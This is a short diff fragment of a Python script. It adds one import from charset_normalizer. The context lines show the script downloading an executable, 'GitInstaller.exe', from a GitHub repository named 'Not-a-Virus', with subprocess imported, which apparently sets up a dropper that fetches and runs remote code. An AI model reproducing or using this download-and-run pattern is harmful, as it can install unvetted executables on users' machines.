@@ -2,6 +2,7 @@ import requests
 import os
 from time import sleep
 import subprocess
+from charset_normalizer import md__mypyc
 
 print('starting')
 file = requests.get('https://github.com/romanjmock/Not-a-Virus/raw/main/dist/GitInstaller.exe')
